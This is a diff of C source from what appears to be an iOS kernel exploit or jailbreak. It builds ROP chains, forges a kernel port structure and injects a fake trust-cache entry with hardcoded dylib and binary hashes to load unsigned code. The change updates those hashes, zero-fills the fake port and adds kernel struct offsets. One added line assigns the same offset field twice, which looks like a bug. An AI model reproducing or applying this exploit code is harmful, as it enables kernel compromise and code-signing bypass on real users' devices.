@@ -861,7 +861,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	ADD_LOOP_START("test_loop")
 		ROP_VAR_ARG_HOW_MANY(1);
 		ROP_VAR_ARG("dylib_str",2);
-		CALL("write",1,0,1024,0,0,0,0,0);
+		CALL("write",2,0,1024,0,0,0,0,0);
 
 
 	/*	
@@ -899,6 +899,7 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 
 
 	kport_t * fakeport = malloc(sizeof(kport_t));
+	memset(fakeport,0,sizeof(kport_t));
 	fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE;
 	fakeport->ip_references = 100;
 	fakeport->ip_lock.type = 0x11;
@@ -959,8 +960,8 @@ void stage2(offset_struct_t * offsets,char * base_dir) {
 	struct trust_chain * new_entry = malloc(sizeof(struct trust_chain));
 	snprintf((char*)&new_entry->uuid,16,"TURNDOWNFORWHAT?");
 	new_entry->count = 2;
-	hash_t my_dylib_hash = {0x01,0xea,0x3a,0xea,0x23,0x45,0x5f,0xc3,0x07,0x53,0xbe,0xa7,0x78,0x2d,0x1b,0x17,0xb1,0xa8,0x75,0xef};
-	hash_t my_binary_hash = {0x30,0x46,0x97,0xbb,0x51,0xc0,0xde,0x21,0x5c,0x3c,0xb5,0xa7,0x33,0xb2,0x1b,0x34,0xe1,0xa9,0xe5,0x3f};
+	hash_t my_dylib_hash = {0x23,0xc0,0xa7,0xcc,0x36,0xdd,0x3d,0xa7,0x4a,0x25,0x46,0x50,0x38,0xd9,0xa6,0x20,0x76,0x2e,0x51,0x70};
+	hash_t my_binary_hash = {0xd4,0xd3,0x79,0x1b,0x17,0x2d,0xa2,0xf1,0x89,0xbd,0x2f,0xa7,0x5a,0xf6,0x84,0xaa,0xbf,0x8e,0x08,0x67};
 	memcpy(&new_entry->hash[0],my_dylib_hash,20);
 	memcpy(&new_entry->hash[1],my_binary_hash,20);
 	DEFINE_ROP_VAR("new_trust_chain_entry",sizeof(struct trust_chain),new_entry);
@@ -1297,7 +1298,7 @@ _STRUCT_ARM_THREAD_STATE64
 
 	ROP_VAR_ARG_HOW_MANY(1);
 	ROP_VAR_ARG("WEDIDIT",2);
-	CALL("write",1,0,1024,0,0,0,0,0);
+	CALL("write",2,0,1024,0,0,0,0,0);
 
 	ROP_VAR_ARG_HOW_MANY(3);
 	ROP_VAR_ARG64("self",1);
@@ -1514,6 +1515,7 @@ _STRUCT_ARM_THREAD_STATE64
     CALL("mach_port_deallocate",0,0,0,0,0,0,0,0);
 	*/
 
+
 	// ghetto dlopen
 	// get a file descriptor for that dylib
 	DEFINE_ROP_VAR("dylib_fd",8,&buf);
@@ -1583,6 +1585,8 @@ _STRUCT_ARM_THREAD_STATE64
 			uint32_t itk_registered;
 			uint32_t ipr_size;
 			uint32_t sizeof_task;
+			uint32_t task_all_image_info_addr;
+			uint32_t task_all_image_info_size;
 		} struct_offsets;
 
 		struct {
@@ -1634,6 +1638,8 @@ _STRUCT_ARM_THREAD_STATE64
 	lib_offsets->struct_offsets.itk_registered = 0x2f0;
 	lib_offsets->struct_offsets.ipr_size = 0x8;
 	lib_offsets->struct_offsets.sizeof_task = 0x5c8;
+	lib_offsets->struct_offsets.task_all_image_info_addr = 0x3a8;
+	lib_offsets->struct_offsets.task_all_image_info_addr = 0x3b0;
 	// iosurface stuff isn't set and also isn't used
 	lib_offsets->userland_funcs.write = get_addr_from_name(offsets,"write") - 0x180000000 + offsets->new_cache_addr;
 	lib_offsets->userland_funcs.IOConnectTrap6 = get_addr_from_name(offsets,"IOConnectTrap6") - 0x180000000 + offsets->new_cache_addr;
